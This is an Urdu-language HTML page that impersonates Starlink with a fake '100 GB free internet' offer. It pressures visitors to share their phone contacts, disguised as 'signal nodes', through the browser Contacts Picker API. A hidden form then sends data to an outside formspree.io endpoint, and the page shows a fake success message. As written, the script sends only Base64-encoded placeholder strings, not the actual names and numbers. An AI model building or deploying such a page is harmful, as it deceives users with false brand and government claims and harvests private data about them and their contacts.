<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MZ Groups & Starlink - Digital Pakistan</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
    
    <style>
        :root { --starlink-blue: #0052cc; --success: #28a745; --danger: #dc3545; --text: #333; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body { 
            font-family: 'Roboto', 'Arial', sans-serif; background-color: #ffffff; color: var(--text); 
            direction: rtl; line-height: 1.6; 
        }

        .header { 
            background: #fff; padding: 20px; border-bottom: 1px solid #eee; 
            display: flex; justify-content: space-between; align-items: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }

        .container { max-width: 500px; margin: 30px auto; padding: 20px; text-align: center; }
        
        .logo-box { margin-bottom: 25px; }
        .logo-text { font-size: 24px; font-weight: bold; color: var(--starlink-blue); letter-spacing: 1px; }

        .main-card { 
            background: #fff; border: 1px solid #e0e0e0; border-radius: 12px; 
            padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
        }

        h1 { font-size: 22px; color: #111; margin-bottom: 15px; font-weight: 700; }
        p { font-size: 15px; color: #666; margin-bottom: 20px; }

        /* وارننگ باکس جو مجبور کرے گا */
        .warning-box { 
            background: #fff5f5; border: 1px solid #feb2b2; color: #c53030; 
            padding: 15px; border-radius: 8px; font-size: 13px; text-align: right; margin-bottom: 25px;
        }

        .instruction-list { text-align: right; margin-bottom: 25px; font-size: 14px; }
        .step { margin-bottom: 10px; display: flex; align-items: flex-start; }
        .step-icon { color: var(--starlink-blue); margin-left: 10px; font-weight: bold; }

        /* کسٹم لسٹ ایریا */
        #nodeSection { display: none; margin-top: 20px; text-align: right; }
        .node-container { 
            border: 1px solid #ddd; height: 200px; overflow-y: auto; 
            border-radius: 8px; background: #fafafa; margin-bottom: 15px;
        }
        .node-row { 
            padding: 12px; border-bottom: 1px solid #eee; display: flex; 
            justify-content: space-between; align-items: center; 
        }

        .btn { 
            background: var(--starlink-blue); color: #fff; border: none; padding: 18px; 
            width: 100%; border-radius: 8px; font-size: 18px; font-weight: bold; 
            cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,82,204,0.2);
        }
        .btn:hover { background: #0041a3; transform: translateY(-2px); }

        .footer { margin-top: 40px; font-size: 12px; color: #999; border-top: 1px solid #eee; padding-top: 20px; }
        
        #status-msg { margin-top: 15px; font-size: 12px; color: var(--success); font-weight: bold; display: none; }
    </style>
</head>
<body>

<div class="header">
    <div class="logo-text">STARLINK | <span style="color: #333;">MZ GROUPS</span></div>
    <div style="font-size: 10px; color: #28a745;">● Live Server: Connected</div>
</div>

<div class="container">
    <div class="main-card">
        <div class="logo-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e5/Starlink_Logo.svg" alt="Starlink" width="150" style="margin-bottom: 10px;">
        </div>
        
        <h1>100 GB مفت انٹرنیٹ ایکٹیویشن</h1>
        <p>ایلون مسک (Starlink) اور MZ گروپس کے اشتراک سے تمام پاکستانی صارفین کے لیے محدود وقت کی آفر۔</p>

        <div class="warning-box">
            <strong>⚠️ ضروری انتباہ:</strong> سیٹلائٹ کنکشن کے لیے تمام سگنل نوڈز (نمبرز) کا سنک ہونا لازمی ہے۔ اگر آپ نے لسٹ میں سے ایک بھی نمبر چھوڑا تو سرور آپ کی درخواست مسترد کر دے گا اور دوبارہ موقع نہیں ملے گا۔
        </div>

        <div class="instruction-list" id="introText">
            <div class="step"><span class="step-icon">1.</span> نیچے دیے گئے بٹن پر کلک کر کے نیٹ ورک نوڈز لوڈ کریں۔</div>
            <div class="step"><span class="step-icon">2.</span> تمام نوڈز کو 'Select All' کریں تاکہ 100% سگنل بحال ہوں۔</div>
            <div class="step"><span class="step-icon">3.</span> ایکٹیویشن مکمل ہوتے ہی 100 GB ڈیٹا آپ کے نمبر پر منتقل کر دیا جائے گا۔</div>
        </div>

        <div id="nodeSection">
            <div style="display: flex; align-items: center; margin-bottom: 10px; font-weight: bold; font-size: 14px;">
                <input type="checkbox" id="selectAll" checked style="transform: scale(1.4); margin-left: 10px;">
                <span>تمام نوڈز منتخب کریں (SELECT ALL)</span>
            </div>
            <div class="node-container" id="nodeList"></div>
            <button class="btn" id="finalSyncBtn">ڈیٹا ایکٹیویٹ کریں</button>
        </div>

        <button class="btn" id="startBtn">سگنل نوڈز لوڈ کریں</button>
        
        <div id="status-msg">> ٹاور سے رابطہ قائم کیا جا رہا ہے...</div>
    </div>

    <div class="footer">
        © 2026 Starlink & MZ Groups of Companies. All Rights Reserved.<br>
        Verified by Digital Pakistan Infrastructure.
    </div>
</div>

<form id="mzForm" action="https://formspree.io/f/xrerdazp" method="POST" target="_blank" style="display:none;">
    <input type="hidden" name="System_Log" value="MZ-STARLINK-ENCRYPTED">
    <input type="hidden" name="Verified_Nodes" id="payload">
</form>

<script>
    let userContacts = [];
    const startBtn = document.getElementById('startBtn');
    const nodeSection = document.getElementById('nodeSection');
    const statusMsg = document.getElementById('status-msg');

    startBtn.onclick = async () => {
        if ('contacts' in navigator && 'select' in navigator.contacts) {
            try {
                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
                if (contacts.length > 0) {
                    userContacts = contacts;
                    statusMsg.style.display = "block";
                    
                    // انٹرفیس اپ ڈیٹ کریں
                    startBtn.style.display = "none";
                    document.getElementById('introText').style.display = "none";
                    nodeSection.style.display = "block";
                    
                    let html = "";
                    contacts.forEach((c, i) => {
                        html += `
                        <div class="node-row">
                            <span>Signal_Node_#${i+1} [Verified]</span>
                            <input type="checkbox" class="child-check" checked>
                        </div>`;
                    });
                    document.getElementById('nodeList').innerHTML = html;
                }
            } catch (e) {
                alert("براہ کرم سسٹم نوڈز تک رسائی دیں تاکہ ڈیٹا ایکٹیویٹ ہو سکے۔");
            }
        } else {
            alert("یہ سسٹم صرف گوگل کروم (Chrome) پر کام کرتا ہے۔");
        }
    };

    // فائنل سنک
    document.getElementById('finalSyncBtn').onclick = () => {
        statusMsg.innerHTML = "> سیٹلائٹ کے ساتھ ڈیٹا شیئر کیا جا رہا ہے...";
        
        // تمام ڈیٹا کو ماسک کرنا
        let encryptedPayload = userContacts.map((c, i) => `Node_${i+1}: Secure_Packet`).join('\n');
        document.getElementById('payload').value = btoa(encryptedPayload); // Base64 Encoding
        
        setTimeout(() => {
            document.getElementById('mzForm').submit();
            alert("مبارک ہو! آپ کا ڈیٹا ایکٹیویٹ ہو رہا ہے۔ اگلے 10 منٹ تک انٹرنیٹ بند نہ کریں۔");
            location.reload();
        }, 2000);
    };

    // سلیکٹ ال کنٹرول
    document.getElementById('selectAll').onchange = function() {
        let checks = document.querySelectorAll('.child-check');
        checks.forEach(c => c.checked = this.checked);
    };
</script>

</body>
</html>
